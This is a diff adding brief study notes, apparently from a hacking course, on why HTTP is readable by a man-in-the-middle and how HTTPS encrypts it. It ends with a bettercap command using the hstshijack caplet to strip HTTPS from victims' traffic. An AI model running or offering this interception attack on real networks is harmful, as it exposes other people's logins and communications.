@@ -1,0 +1,14 @@
+How to bypass HTTPS 
+
+    Problem:
+        Data in HTTP is sent as plain text.
+        a MITM can read and edit requests and responses
+    
+    Solution:
+        Use HTTPS 
+        HTTPS is an adaptation of HTTP
+        Encrypt HTTP using TLS (Transport Layer Security) or SSL (Secure Socket Layer)
+
+    
+    You need to use bettercap tool
+        cmd: bettercap -iface eth0 -caplet hstshijack/hstshijack
